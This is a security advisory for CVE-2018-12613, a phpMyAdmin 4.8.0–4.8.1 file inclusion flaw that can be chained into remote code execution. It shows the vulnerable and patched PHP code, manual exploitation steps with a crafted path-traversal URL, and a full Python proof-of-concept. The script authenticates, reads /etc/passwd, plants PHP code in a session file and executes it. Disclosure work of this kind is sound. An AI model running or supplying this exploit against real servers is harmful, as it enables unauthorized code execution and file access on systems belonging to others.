**Vulnerabilities Summary**<br>
Authenticated users can exploit a file inclusion vulnerability in phpMyAdmin which can then be combined with another vulnerability, to perform Remote Code Execution. In addition, authenticated attackers can view files and execute PHP files that located on the server by exploiting a bug in the part of the code that is responsible for redirects and loading of whitelisted pages.

**Vendor Response**<br>
The vendor, phpMyAdmin, issued a fix on the 21st of June 2018. Version 4.8.2 and newer aren’t affected.

**CVE**<br>
CVE-2018-12613

**Credit**<br>
An independent security researcher, Henry Huang working for CyCarrier CSIRT, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Affected systems**<br>
phpMyAdmin 4.8.0 and 4.8.1 (running on Linux systems)

**Vulnerability Details**<br>
The root cause of the vulnerability can be found inside /index.php file in lines 54-63 which calls the function Core::CheckPageValidity that is located in /libraries/classes/Core.php in lines 444-476:
Index.php:

```php
if (! empty($_REQUEST['target'])
    && is_string($_REQUEST['target'])
    && ! preg_match('/^index/', $_REQUEST['target'])
    && ! in_array($_REQUEST['target'], $target_blacklist)
    && Core::checkPageValidity($_REQUEST['target'])
) {
    include $_REQUEST['target'];
    exit;
}
```

/libraries/classes/Core.php:

```php
public static function checkPageValidity(&$page, array $whitelist = [])
{
    if (empty($whitelist)) {
        $whitelist = self::$goto_whitelist;
    }
    if (! isset($page) || !is_string($page)) {
        return false;
    }
    if (in_array($page, $whitelist)) {
        return true;
    }
    $_page = mb_substr(
        $page,
        0,
        mb_strpos($page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
        return true;
    }
    $_page = urldecode($page);
    $_page = mb_substr(
        $_page,
        0,
        mb_strpos($_page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
        return true;
    }
    return false;
}
```
We can see that there is a flaw in the check that was put in to prevent a file inclusion vulnerability, which can be bypassed by referencing ‘db_sql.php?’ in our request.
Steps to exploit the vulnerabilities:

* Log in to phpMyAdmin
* Run SQL query that contains the PHP arbitrary code, for example: select ‘<?php phpcredits(); ?>’
* Take the session ID (it is the value of the phpMyAdmin inside the cookie)
* Create using this information a URL similar to this:

`http://<your domain or ip>/phpmyadmin/index.php?target=db_sql.php%253f%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flib%2Fphp%2Fsessions%2Fsess_skf209lf7h9gei97puae1829t4k1td4n`

**Result**<br>
<img src="https://blogs.securiteam.com/wp-content/uploads/2018/07/Capture.png">
Let’s look at the patched code and understand how the issue was fixed.<br>
Index.php:

```php
if (! empty($_REQUEST['target'])
    && is_string($_REQUEST['target'])
    && ! preg_match('/^index/', $_REQUEST['target'])
    && ! in_array($_REQUEST['target'], $target_blacklist)
    && Core::checkPageValidity($_REQUEST['target'], [], true)
) {
    include $_REQUEST['target'];
    exit;
}
```

Core.php:

```php
public static function checkPageValidity(&$page, array $whitelist = [], $include = false)
    {
        if (empty($whitelist)) {
            $whitelist = self::$goto_whitelist;
        }
        if (! isset($page) || !is_string($page)) {
            return false;
        }
        if (in_array($page, $whitelist)) {
            return true;
        }
        if ($include) {
            return false;
        }
        $_page = mb_substr(
            $page,
            0,
            mb_strpos($page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }
        $_page = urldecode($page);
        $_page = mb_substr(
            $_page,
            0,
            mb_strpos($_page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }
        return false;
}
```

We can see that the function Core::CheckPageValidity has another parameter, “$include”. $include is passed as true from index.php to the function and the whitelist is empty so the function will return false and the vulnerability is now blocked.

**PoC**<br>
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
import sys
import random
import hashlib
import logging
import argparse
import requests
from HTMLParser import HTMLParser
logger = logging
logging.basicConfig(level=logging.DEBUG, format='%(levelname)s: %(message)s')
URL = None
PROXIES = dict()
page = '/index.php'
def _rand_md5():
    return hashlib.md5(str(random.randint(0, 10000000000000000000))).hexdigest()
def get_token(sess, page):
    resp = sess.get(URL + page)
    try:
        token = re.findall(
            r'token"\s*value="([^"]*)"', resp.content, flags=re.MULTILINE)[0]
    except IndexError:
        logger.error('Failed to get CSRF token from server')
        return None
    return HTMLParser().unescape(token)
def main(username, password, php_code, page):
    session = requests.Session()
    session.proxies = PROXIES
    token = get_token(session, page)
    session_id = _rand_md5()
    response = session.post(URL + page, data={
        'set_session': session_id,
        'pma_username': username,
        'pma_password': password,
        'server': 1,
        'target': 'index.php',
        'token': token
    })
    updir = None
    for dir_level in range(8):
        updir = '../' * dir_level
        response = session.get(URL + page, params={
            'target': 'sql.php%3F/../' + updir + 'etc/passwd'
        })
        if '/sbin/nologin' in response.content:
            logger.info('/etc/passwd is %d levels away', dir_level)
            break
    else:
        logger.error('This version is not vulnerable, or the server is not linux')
        return 1
    token = get_token(session, '/server_sql.php')
    sql = ("select '&lt;?php " + php_code + " ?&gt;'")
    logger.debug('Executing SQL query %r', sql)
    response = session.post(URL + '/import.php', data={
        'is_js_confirmed': 0,
        'token': token,
        'pos': 0,
        'goto': 'server_sql.php',
        'message_to_show': 'Your SQL query has been executed successfully',
        'prev_sql_query': '',
        'sql_query': sql,
        'sql_delimiter': ';',
        'show_query': 1,
        'fk_checks': 0,
        'SQL': 'Go',
        'ajax_request': 'true'
    })
    response = session.get(URL + '/index.php', params={
        'target': ('db_sql.php%3f/../' + updir + 'var/lib/php/sessions/sess_' + session.cookies['phpMyAdmin'])
    })
    site = open('result.html', 'w')
    site.write(response.content)
    if response.status_code == 200:
        logger.info('Payload succeed. Result is stored inside "result.html" file.')
    else:
        logger.error("Couldn't run payload")
        return 1
    return 0
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--user', required=True)
    parser.add_argument('-p', '--password', required=True)
    parser.add_argument('-U', '--url', required=True)
    parser.add_argument('-P', '--php-payload', required=True)
    args = parser.parse_args()
    URL = args.url
    sys.exit(main(args.user, args.password, args.php_payload, page))
```

**Usage**<br>
python poc.py -u <username> -p <password> -U http://<domain or ip>/phpmyadmin –php-payload=”phpcredits();”
